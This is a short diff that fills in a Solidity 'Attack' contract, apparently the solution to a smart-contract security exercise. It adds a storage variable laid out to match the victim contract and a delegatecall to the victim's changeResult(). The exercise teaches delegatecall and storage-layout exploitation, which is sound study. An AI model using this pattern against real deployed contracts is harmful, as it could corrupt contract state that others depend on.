@@ -10,6 +10,7 @@ contract Attack {
     address internal immutable victim;
     // TODO: Declare some variable here
     // Note: Checkout the storage layout in victim contract
+    uint256 internal dataPosition;
 
     constructor(address addr) payable {
         victim = addr;
@@ -21,5 +22,8 @@ contract Attack {
         // TODO: Add your implementation here
         // Note: Make sure you know how delegatecall works
         // bytes memory data = ...
+        bytes memory data = abi.encodeWithSignature("changeResult()");
+        (bool success, ) = victim.delegatecall(data);
+        require(success, "Exploit failed");
     }
 }
